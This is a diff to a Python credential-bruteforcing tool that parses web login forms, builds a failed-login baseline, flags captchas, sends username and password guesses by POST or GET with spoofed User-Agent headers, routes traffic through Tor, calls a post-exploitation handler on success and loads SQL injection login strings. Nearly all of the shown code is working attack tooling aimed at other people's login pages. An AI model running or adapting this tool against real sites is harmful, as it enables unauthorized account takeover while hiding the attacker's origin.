@@ -8,13 +8,14 @@ import random
 from ftplib import FTP
 import json
 from message import Message
+from form_controls import LoginForm
 try:
 	import pexpect
 except:
 	print('Issues importing \'pexpect\'.. Try: pip install pexpect')
 
 # class: Hive
-# description: This object's purpose is a basic layout of what is needed to bruteforce logins
+# description: This object's purpose is a basic layout of what is needed to bruteforce logins, acts as a skeleton class to other bruteforcers
 class Hive:
 	useTor = None
 	UPDATE_TIME = 10
@@ -290,15 +291,17 @@ class HttpHive(Hive):
 	password_field_name = None
 	username_field_name = None
 	failedbaseline = None
-	# Regular-expressions to find the specific forms ----
+	# Various Regular-expressions 
 	FORM_REGEX = re.compile(r'<form(.*?)<\/form>')
         CLEANUP_REGEX = re.compile(r'\n')
+	CLEANUP2_REGEX = re.compile(r'[(\s\s)|\t|\n]+') 
         NAME_REGEX = re.compile(r'name\=\"(.*?)\"|name\=\'(.*?)\'') 
         VALUE_REGEX = re.compile(r'value\=\"(.*?)\"|value\=\'(.*?)\'')
-        LOGIN_REGEX = re.compile(r'<input\stype\=\"password\"|<input\stype\=\'password\'')
+	LOGIN_REGEX = re.compile(r'type\=[\"\']password[\"\']')
         FIELD_REGEX = re.compile(r'(<input\stype\=.*?>)|(<input\sname\=.*?>)')
 	CHECK_TOR_REGEX = re.compile(r'Congratulations\.\sThis\sbrowser\sis\sconfigured\sto\suse\sTor\.')
 	AUTHENTICATION_TYPE = re.compile(r'method\=\'(post)\'|method\=\"(post)\"|method\=\'(get)\'|method\=\"(get)\"')
+	CAPTCHA_REGEX = re.compile(r'captcha?',re.I)
 	# Base payload for our login attempts
 	basePayload = None
 	proxies = None
@@ -307,14 +310,20 @@ class HttpHive(Hive):
 	SQLInjectionFile = None
 	SQLInjectionCredentialList = None
 	testSQLInjections = None
+	loginForm = None
+	baselineDict = None
+	captchaFlag = None
+	responseTime = None
 
 	def __init__(self):
 		Hive.__init__(self)
-		failedbaseline = dict()
 		self.form_method = 0
 		self.examplePayload = ''
 		self.testSQLInjections = False
 		self.SQLInjectionCredentialList = list()
+		self.baselineDict = dict()
+		self.captchaFlag = False
+		self.responseTime = 0
 	
 	# function: start
 	# param: workers(int)			- The number of threads to create
@@ -335,143 +344,165 @@ class HttpHive(Hive):
 					worker.start()
 				for worker in threads:
 					worker.join()	
-			
 			else:
 				self.__attemptSQLInjection__(self.SQLInjectionCredentialList)
 		Hive.start(self,workers)
 	
+	# function: setupLoginForm
+	# param: html(str)		- The html of the url to the login form
+	# description: Sets up the necessary parameters to interact with the web-form
+	def setupLoginForm(self,html):
+		html = self.CLEANUP2_REGEX.subn(' ',html)[0]
+		form_html = LoginForm.FORM_REGEX.findall(html)[0]
+		self.loginForm = LoginForm(form_html,self.target)				
+		self.baselineDict = self.buildBaselineDict()
+		username = "username-here"
+		password = "password-here"
+		self.examplePayload = self.loginForm.getPayload(username,password)['payload']
 
-	# function: __findForms__
-	# return: [str] 	- array of forms in html code
-	# description: Finds all forms on the html page
-	def __findForms__(self, html):
-		forms = None 
-                if self.CLEANUP_REGEX.search(html):
-                        html = self.CLEANUP_REGEX.subn('',html)[0]
-                        forms = self.FORM_REGEX.findall(html)
-                return forms
-
-
-	# function: __findFields__
-	# param: str		- The form to search for fields
-	# return: dict 		- fields within the form
-	# description: finds all the fields within the form
-	def __findFields__(self, form_code):
-		fields = list()
-                payload = dict()
-		try:
-                	fields = self.FIELD_REGEX.findall(form_code)
-		except: 
-			return None
-		for array in fields:
-			for field in array:
-       		                name = ""
-                 	        value = ""
-                        	if self.NAME_REGEX.search(field):
-                                	name = self.NAME_REGEX.findall(field)[0]
-					if name[0] == '':
-						name = name[1]
-					else:
-						name = name[0]
-                                	if self.LOGIN_REGEX.search(field):
-                                        	self.password_field_name = name
-                        	if self.VALUE_REGEX.search(field):
-                                	value = self.VALUE_REGEX.findall(field)[0]
-					if value[0] == '':
-						value = value[1]
-					else:
-						value = value[0]
-                        	if len(name) > 0 and len(value) > 0:
-                                	payload[name] = value
-                        	elif len(name) > 0:
-                                	payload[name] = ""
-                                	if name != self.password_field_name:
-                                        	self.username_field_name = name
-		if self.form_method == 0:
-			self.examplePayload = payload
-		else:
-			if not self.username:
-				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,'username_here',self.password_field_name,'password_here')
-			else:
-				self.examplePayload = self.target + '?%s=%s&%s=%s'%(self.username_field_name,self.username,self.password_field_name,'password_here')
-                return payload
-
-	# function: __getLoginForm__ 
-	# param: [str]		- An array of html forms
-	# return: str		- The login form 
-	# description: Finds the form that is a login form
-	def __getLoginForm__(self, forms):
-		loginform = None
-                for form in forms:
-			if self.LOGIN_REGEX.search(form):
-                		loginform = form
-                return loginform
-
-
-	# function: attemptLogin - Overriden
-	# param: Credential		- THe credential to attempt a login with
-	# return: Credential
-	# description: Attempts a login with the credential
+	# function: attemptLogin
+	# param: credential(Credential)		- The credential to attempt a login with
+	# return: Boolean			- True if successful
+	# description: Attempts a login with the specified login
 	def attemptLogin(self, credential):
-		Hive.attemptLogin(self,credential)
-		self.basePayload[self.username_field_name] = credential.username
-		self.basePayload[self.password_field_name] = credential.password
-		headers = self.getSpoofedHeaders()
-		# Using POST method authentication
-		if self.form_method == 0:
-			response = requests.post(self.target, data=self.basePayload,headers=headers,proxies=self.proxies)	
-		# Using GET method authentication
+		wasSuccess = False
+		Hive.attemptLogin(self, credential)
+		payloadDict = self.loginForm.getPayload(credential.username,credential.password)
+		payload = None
+		url = payloadDict['url']
+		if payloadDict['method'] == 'POST':
+			payload = payloadDict['payload']
 		else:
-			response = requests.get(self.target+'?%s=%s&%s=%s'%(self.username_field_name,self.basePayload[self.username_field_name],
-									self.password_field_name,self.basePayload[self.password_field_name]),headers=headers,proxies=self.proxies)
-		if self.checkSuccess(response):
-			return True
+			url = payloadDict['payload']
+		response = self.makeRequest(url,payload,payloadDict['method'])
+		wasSuccess = self.checkSuccess(response)
+		return wasSuccess
+	
+	# function: buildBaselineDict
+	# return: dict		- The baseline dict for a failed login attempt
+	# description: Returns a dictionary containing what was determined as baseline values for a failed login attempt.
+	# If while comparing these values to new values, to check if a login was successful, the baseline should deviate greatly from the response being checked
+	def buildBaselineDict(self):
+		baseline = dict()
+		payloadDict = self.loginForm.getPayload('admin','passw')
+		payload = None
+		url = payloadDict['url']
+		if payloadDict['method'] == 'POST':
+			payload = payloadDict['payload']
 		else:
-			return False
+			url = payloadDict['payload']
+		response = self.makeRequest(url,payload,payloadDict['method'])
+		cleaned_html = self.CLEANUP2_REGEX.subn(' ',response.text)[0]
+		try:
+			baseline['response-length'] = int(response.headers['content-length'])
+		except KeyError as e:
+			baseline['response-length'] = len(response.text)
+		baseline['url'] = response.url
+		baseline['status-code'] = response.status_code
+		baseline['total-forms'] = len(LoginForm.FORM_REGEX.findall(cleaned_html))
+		baseline['response-time'] = response.elapsed.total_seconds()
+		if self.CAPTCHA_REGEX.search(cleaned_html):
+			baseline['captcha'] = True
+			self.captchaFlag = True
+		else:
+			baseline['captcha'] = False
+		return baseline
 
-		
 	# function: checkSuccess
-	# param: response
-	# return: Boolean
+	# param: response(response)	- The response to check for successful login
+	# description: Checks if this response object was a successful login
 	def checkSuccess(self,response):
-		success = False
-                if response.url != self.failed_dict['url']:
-                        self.setFailedBaseline(self.basePayload)
-                        if response.url != self.failed_dict['url']:
-				if len(self.__findForms__(response.text)) != len(self.failed_dict['forms']):
-                                	success = True
-                return success
+		wasSuccess = self.compareResponseToBaseline(response)	
+		return wasSuccess
 
-        # function: getFailedBaseline
-        # param: dict           - base payload for post request
-        # description: Gets the baseline for a failed login
-        def setFailedBaseline(self, payload):
-                failedbaseline = dict()
-                payload[self.username_field_name] = 'user'
-                payload[self.password_field_name] = 'pass'
-                response = requests.post(self.target, data=payload,headers=self.getSpoofedHeaders(),proxies=self.proxies)
-                failedbaseline['response'] = response
-                failedbaseline['url'] = response.url
-                failedbaseline['html'] = response.text
-		failedbaseline['forms'] = self.__findForms__(response.text)
-                self.failed_dict = failedbaseline
-	
-	
+	# function: compareResponseToBaseline
+	# param: response(response)	- The response object to compare to baseline with
+	# return: Boolean		- True | False if not comparable differences
+	# description: Determines if this response was successful authentication or not 
+	def compareResponseToBaseline(self,response):
+		totalForms = 0
+		length = 0
+		responseTime = response.elapsed.total_seconds()
+		self.responseTime += responseTime
+		wasSuccess = False
+		cleanedHtml = self.CLEANUP2_REGEX.subn(' ',response.text)[0]
+		# Flags for changes found from baseline, not all are currently being used
+		responseLengthFlag = False
+		responseUrlFlag = False
+		statusCodeFlag = False
+		totalFormFlag = False
+		captchaFlag = False
+		timeFlag = False
+		# ----------------- End Flags -------------------------------------------
+		try:	
+			lenth = int(response.headers['content-length'])
+		except KeyError as e:
+			length = len(response.text)
+		totalForms = len(LoginForm.FORM_REGEX.findall(cleanedHtml))
+		if self.CAPTCHA_REGEX.search(cleanedHtml):
+			captchaFlag = True
+		if response.status_code is not self.baselineDict['status-code']:
+			statusCodeFlag = True	
+		# Not relieable, maybe add a check sum for multiple parts of the page, 
+		# and return a % based result on how many checksums have changed?
+		# However this could be a slow down/bottle neck 
+		if abs(length-self.baselineDict['response-length']) > 100:
+			responseLengthFlag = True
+		if totalForms != self.baselineDict['total-forms']:
+			totalFormFlag = True
+		if response.url != self.baselineDict['url']:
+			responseUrlFlag = True
+		# -------------- NOW CHECKING FLAGS AND DETERMINING IF SUCCESS ----------
+		if responseUrlFlag:
+			# So far the only signifcant change I've found after a login, is the total form count on the URL
+			# Until I find more consistent changes, this will be the main deciding factor
+			if totalFormFlag:
+				wasSuccess = True
+		else:
+			if not captchaFlag:
+				if totalFormFlag:
+					wasSuccess = True
+		# Should notify user at this point a captcha was detected
+		if captchaFlag:
+			wasSuccess = False 
+			self.captchaFlag = True
+		return wasSuccess
+
+	# function: makeRequest
+	# param: url(str)		- The url to make a request to
+	# param: payload(dict|None)	- The payload to use
+	# param: method(str='POST')	- The method to use with this request, POST or GET
+	# description: Used when making request, called from here rather then arbitary places. Easier to keep track of and ensures consistents between requests
+	def makeRequest(self, url, payload, method='POST'):
+		headers = self.getSpoofedHeaders()
+		if method == 'POST':
+			response = requests.post(url, data=payload, headers=headers, proxies=self.proxies)
+			return response
+		# Must be a GET request
+		else:
+			response = requests.get(url, headers=headers, proxies=self.proxies)
+			return response
+
+	# function: getStatistics
+	# return: dict
+	# description: returns a dictionary of statistics on this attack
+	def getStatistics(self):
+		elapsed = time.time() - self.startTime
+		self.lastUpdated = time.time()
+		aps = float(self.total_attempts/elapsed)
+		averageResponseTime = float(self.responseTime/self.total_attempts)
+		return {'target':self.target,'total-attempts':str(self.total_attempts),'attempts-per-second':'%.2f'%aps,'total-time':'%.2f (seconds)'%elapsed,
+			'average-response-time':'%.3f (seconds)'%averageResponseTime}
+
 	# function: setup - Overriden
 	# description: Prepares this Hive for its attack, *NOTE* This must be called before start is called
 	def setup(self):
 		Hive.setup(self)
-		html = requests.get(self.target,headers=self.getSpoofedHeaders(),proxies=self.proxies).text
-		forms = self.__findForms__(html)
-		login = self.__getLoginForm__(forms)
-		self.form_method = self.__checkLoginType__(forms)
-		self.basePayload = self.__findFields__(login)
-		if self.basePayload:
-			self.setFailedBaseline(self.basePayload)
-		# Setting handle for post exploitation, to self.postExploit
-		self.setOnSuccessHandle(self.postExploit)
 		if self.useTor:
 			self.setupTOR()
+		html = self.makeRequest(self.target, None, "GET").text
+		self.setupLoginForm(html)
+		self.setOnSuccessHandle(self.postExploit)
 	
 	# function: getSpoofedHeaders
 	# return: dict		- A dict that represents a user-agent inside the HTTP header
@@ -487,7 +518,7 @@ class HttpHive(Hive):
 	# You don't need the same signature for every post exploit function, however you do need to use: self.setOnSuccessHandle(somefunction) to set the handle
 	def postExploit(self,credential):
 		# Ensuring success, *NOTE* currently there is a threading bug that is overwriting parts of memory?
-		# This is a, jimmy rigged way of doing, however it will suffice, and doesn't hurt performance, as this will only happen, 1-2 times during a 
+		# This is a, jimmy rigged way of doing, however it will suffice, and doesn't hurt performance, as this will only happen, 1-3 times during a 
 		# bruteforce
 		if self.attemptLogin(credential):
 			self.totalLogins += 1
@@ -505,7 +536,7 @@ class HttpHive(Hive):
 			self.setupTOR()
 		if self.proxies:
 			try:
-				response = requests.get('https://check.torproject.org/',headers=self.getSpoofedHeaders(),proxies=self.proxies)
+				response = self.makeRequest('http://check.torproject.org/', None, "GET")
 				if self.CHECK_TOR_REGEX.search(response.text):
 					isConfigured = True	
 			except Exception as e:
@@ -517,20 +548,6 @@ class HttpHive(Hive):
 	def setupTOR(self):
 		self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}
 	
-	# function: __checkLoginType__
-	# param: array		- an array of forms
-	# return: int		- 0 for POST and 1 for GET, None for none found	
-	# description: Checks the array of forms for the Type of login present
-	def __checkLoginType__(self,forms):
-		form_method = None
-		if self.AUTHENTICATION_TYPE.search(str(forms)):
-			ATYPE = self.AUTHENTICATION_TYPE.findall(str(forms))[0]
-			if len(ATYPE[0]) > 0 or len(ATYPE[1]) > 0:
-				form_method = 0
-			elif len(ATYPE[2]) > 0 or len(ATYPE[3]) > 0:
-				form_method = 1
-		return form_method
-
 	# function: __loadSQLInjectionFields__
 	# description: Loads some SQL Injections specific for logins, into self.SQLInjectionCredentialList
 	# 	SQLInjectionCredentialList is used within __attemptSQLInjection__
